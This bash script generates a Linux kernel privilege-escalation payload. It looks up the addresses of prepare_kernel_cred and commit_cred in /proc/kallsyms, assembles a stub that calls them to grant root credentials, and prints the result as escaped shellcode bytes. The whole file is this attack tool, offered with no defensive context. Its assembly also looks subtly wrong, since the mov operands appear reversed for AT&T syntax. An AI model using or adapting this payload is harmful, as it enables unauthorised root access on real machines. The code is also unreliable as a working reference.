#!/bin/bash

function getfunaddr()
{
	grep -E "T[ \t]+$1" /proc/kallsyms | cut -d' ' -f1
}

PREPARE_KERNEL_CRED=$(getfunaddr prepare_kernel_cred)
COMMIT_CRED=$(getfunaddr commit_cred)

tee payload.s << PAYLOAD
xor %rax,%rax
mov %r10,0x$PREPARE_KERNEL_CRED
call *%r10
mov %r10,0x$COMMIT_CRED
call *%r10
ret
PAYLOAD

gcc -c payload.s -o payload -nostdlib -Ttext=0 

objdump -d payload

rm payload.s

BINPAYLOAD=$(readelf -x .text payload |grep 0x | awk '{$NF=$1=""; print $0;}'| tr -d '\040\011\012\015')

rm payload

echo -e "\n$BINPAYLOAD\n"

echo $BINPAYLOAD | sed -e 's/\(..\)/\\x\1/g'
